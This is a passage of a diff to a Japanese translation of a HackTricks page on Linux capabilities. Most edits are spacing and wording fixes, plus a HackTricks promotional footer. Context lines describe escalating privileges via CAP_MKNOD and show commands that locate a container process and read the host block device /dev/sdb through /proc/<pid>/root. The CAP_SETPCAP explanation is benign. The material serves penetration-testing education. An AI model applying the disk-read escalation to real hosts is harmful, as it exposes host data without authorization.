 この能力は、デバイスファイルを作成する能力を必要とするプロセスにとって不可欠であり、キャラクタまたはブロックデバイスを介して直接ハードウェアと対話することを容易にします。
 
-これはデフォルトの docker 機能です ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。
+これはデフォルトの Docker 機能です ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。
 
 この能力は、以下の条件下でホスト上で特権昇格（フルディスク読み取りを通じて）を行うことを許可します：
 
@@ -1551,21 +1576,21 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-このアプローチにより、標準ユーザーはコンテナを通じて`/dev/sdb`からデータにアクセスし、潜在的に読み取ることができ、共有ユーザー名前空間とデバイスに設定された権限を利用します。
+このアプローチにより、標準ユーザーはコンテナを通じて `/dev/sdb` からデータにアクセスし、潜在的に読み取ることができ、共有ユーザー名前空間とデバイスに設定された権限を利用します。
 
 ### CAP\_SETPCAP
 
-**CAP_SETPCAP**は、プロセスが**他のプロセスの能力セットを変更する**ことを可能にし、効果的、継承可能、許可されたセットからの能力の追加または削除を許可します。ただし、プロセスは自分の許可されたセットにある能力のみを変更できるため、他のプロセスの特権を自分のもの以上に引き上げることはできません。最近のカーネルの更新により、これらのルールが厳格化され、`CAP_SETPCAP`は自分自身またはその子孫の許可されたセット内の能力を減少させることのみを許可され、セキュリティリスクを軽減することを目的としています。使用するには、効果的なセットに`CAP_SETPCAP`があり、ターゲットの能力が許可されたセットに存在する必要があり、`capset()`を使用して変更を行います。これが`CAP_SETPCAP`の核心的な機能と制限を要約し、特権管理とセキュリティ強化におけるその役割を強調しています。
+**CAP_SETPCAP** は、プロセスが他のプロセスの **能力セットを変更する** ことを可能にし、効果的、継承可能、許可されたセットからの能力の追加または削除を許可します。ただし、プロセスは自分の許可されたセットに存在する能力のみを変更できるため、他のプロセスの特権を自分のもの以上に引き上げることはできません。最近のカーネルの更新により、これらのルールが厳格化され、`CAP_SETPCAP` は自分自身またはその子孫の許可されたセット内の能力を減少させることのみを許可され、セキュリティリスクを軽減することを目的としています。使用するには、効果的なセットに `CAP_SETPCAP` を持ち、ターゲットの能力を許可されたセットに持っている必要があり、`capset()` を使用して変更を行います。これが `CAP_SETPCAP` の核心的な機能と制限を要約し、特権管理とセキュリティ強化におけるその役割を強調しています。
 
-**`CAP_SETPCAP`**は、プロセスが**他のプロセスの能力セットを変更する**ことを可能にするLinuxの能力です。他のプロセスの効果的、継承可能、許可された能力セットから能力を追加または削除する能力を付与します。ただし、この能力の使用方法には特定の制限があります。
+**`CAP_SETPCAP`** は、プロセスが他のプロセスの **能力セットを変更する** ことを可能にするLinuxの能力です。他のプロセスの効果的、継承可能、許可された能力セットから能力を追加または削除する能力を付与します。ただし、この能力の使用方法には特定の制限があります。
 
-`CAP_SETPCAP`を持つプロセスは、**自分の許可された能力セットにある能力のみを付与または削除できます**。言い換えれば、プロセスは自分が持っていない能力を他のプロセスに付与することはできません。この制限により、プロセスは他のプロセスの特権を自分の特権レベル以上に引き上げることができなくなります。
+`CAP_SETPCAP` を持つプロセスは、**自分の許可された能力セットにある能力のみを付与または削除できます**。言い換えれば、プロセスは自分がその能力を持っていない場合、他のプロセスにその能力を付与することはできません。この制限により、プロセスは他のプロセスの特権を自分の特権レベル以上に引き上げることができなくなります。
 
-さらに、最近のカーネルバージョンでは、`CAP_SETPCAP`能力が**さらに制限されました**。もはやプロセスが他のプロセスの能力セットを恣意的に変更することは許可されていません。代わりに、**自分の許可された能力セットまたはその子孫の許可された能力セット内の能力を低下させることのみを許可します**。この変更は、能力に関連する潜在的なセキュリティリスクを軽減するために導入されました。
+さらに、最近のカーネルバージョンでは、`CAP_SETPCAP` の能力が **さらに制限されました**。もはやプロセスが他のプロセスの能力セットを恣意的に変更することは許可されていません。代わりに、**自分の許可された能力セットまたはその子孫の許可された能力セット内の能力を下げることのみを許可します**。この変更は、能力に関連する潜在的なセキュリティリスクを軽減するために導入されました。
 
-`CAP_SETPCAP`を効果的に使用するには、効果的な能力セットにその能力があり、ターゲットの能力が許可された能力セットに存在する必要があります。その後、`capset()`システムコールを使用して他のプロセスの能力セットを変更できます。
+`CAP_SETPCAP` を効果的に使用するには、効果的な能力セットにその能力を持ち、ターゲットの能力を許可された能力セットに持っている必要があります。その後、`capset()` システムコールを使用して他のプロセスの能力セットを変更できます。
 
-要約すると、`CAP_SETPCAP`はプロセスが他のプロセスの能力セットを変更することを許可しますが、自分が持っていない能力を付与することはできません。さらに、セキュリティ上の懸念から、その機能は最近のカーネルバージョンで制限され、自分の許可された能力セットまたはその子孫の許可された能力セット内の能力を減少させることのみが許可されています。
+要約すると、`CAP_SETPCAP` はプロセスが他のプロセスの能力セットを変更することを許可しますが、自分が持っていない能力を付与することはできません。さらに、セキュリティ上の懸念から、その機能は最近のカーネルバージョンで制限され、自分の許可された能力セットまたはその子孫の許可された能力セット内の能力を減少させることのみが許可されています。
 
 ## 参考文献
 
@@ -1584,7 +1609,7 @@ head /proc/12345/root/dev/sdb
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**で最も重要なイベントの一つです。**技術知識の促進**を使命とし、この会議はあらゆる分野の技術とサイバーセキュリティの専門家の熱い交流の場です。
+[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術知識を促進することを使命として**、この会議はあらゆる分野の技術とサイバーセキュリティの専門家の熱い交流の場です。
 
 {% embed url="https://www.rootedcon.com/" %}
 {% hint style="success" %}
@@ -1596,8 +1621,8 @@ GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
